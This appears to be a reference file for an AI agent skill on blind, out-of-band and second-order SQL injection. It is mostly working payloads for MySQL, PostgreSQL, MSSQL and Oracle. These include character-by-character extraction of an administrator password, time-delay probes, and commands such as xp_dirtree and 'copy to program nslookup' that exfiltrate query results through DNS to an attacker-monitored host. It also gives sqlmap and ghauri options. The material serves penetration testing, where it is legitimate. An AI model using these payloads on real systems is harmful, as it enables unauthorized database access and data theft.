# Blind, out-of-band, and second-order SQLi

Full detail behind SKILL.md section 3. Use these when the app returns no query output. From notes 03, 04, 06, 18, 21, 24.

## Boolean-based blind
The app shows a detectable difference (a "Welcome back" flag, a non-empty field, a 200 vs empty) depending on a condition.
- Confirm: `' AND 1=1-- -` (true -> normal) vs `' AND 1=2-- -` (false -> different). Real case: a `NameEntity` field that is populated vs empty (note 22); a signup "taken/available" flag.
- Extract one char at a time with binary search: `' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm'-- -`, narrow the range, then `= 's'`. (`SUBSTR` on Oracle.)
- Header context works the same: append the boolean to a `User-Agent` (note 18).

## Time-based blind
When errors are handled gracefully and no boolean difference shows, delay the response conditionally.
- Unconditional confirm: MySQL `SLEEP(5)`, PG `pg_sleep(5)`, MSSQL `WAITFOR DELAY '0:0:5'`, Oracle `dbms_pipe.receive_message(('a'),5)`.
- Conditional (extract): MSSQL `'; IF (cond) WAITFOR DELAY '0:0:10'--`; MySQL `' AND IF(cond,SLEEP(10),0)-- -`; PG `' AND (SELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END)-- -`.
- A context-robust MySQL payload (note 24): `'XOR(if(now()=sysdate(),SLEEP(N),0))XOR'Z`.
- **Prove it with scaling**: baseline, then `SLEEP(5)/10/15` should give ~5/10/15s. A single slow response is not proof (note 24).

## Out-of-band (OAST / DNS)
When the query is async or reveals nothing, make the DB open an outbound connection you monitor (DNS is most reliable; egress is usually allowed). Use Burp Collaborator or Interactsh.
- MSSQL: `'; exec master..xp_dirtree '//<sub>.<collab>/a'--` (UNC path -> DNS).
- PostgreSQL: `copy (SELECT '') to program 'nslookup <sub>.<collab>'`.
- MySQL (Windows): `LOAD_FILE('\\\\<collab>\\a')`, `SELECT ... INTO OUTFILE '\\\\<collab>\a'`.
- Oracle: `SELECT EXTRACTVALUE(xmltype('<?xml ...><!DOCTYPE root [<!ENTITY % r SYSTEM "http://<sub>.<collab>/"> %r;]>'),'/l') FROM dual`.
- **Exfiltrate in the subdomain**: put query output into the hostname, e.g. MSSQL `declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.<collab>/a"')`. The DNS log shows `S3cure.<collab>`.
Prefer OAST even when other blind channels work: high success rate and direct exfiltration.

## Second-order (stored) SQLi
Input is stored safely in one request, then reused unsafely in a later, different context (deemed trusted because it came from the DB). Notes 06, 21.
- Inject a stored field (username, display name, preference, report param), then crawl for the endpoint that reuses it. The payload fires later, not at storage.
- NetSPI case (note 21): a date `Value` in stored `ReportParams` fires in the export query; confirmed with `WAITFOR`, exploited OOB with `xp_dirtree` exfiltrating `DB_NAME()`/`@@SERVERNAME` in the DNS subdomain.
- Detection tip: when a boolean/time payload in a field does nothing immediately, test whether a *later* action (report, profile render, search) triggers it.

## Tooling for blind
- sqlmap `--technique=B` (boolean), `=T` (time), `=E` (error); raise `--time-sec`/`--delay` on slow targets.
- ghauri is strong for time-based blind on unstable/WAF-ish targets (finer timing/retry control); `--technique T --time-sec 20 --delay 20` (note 24).
- Confirm manually (curl/Repeater) before automating, so the report is credible.
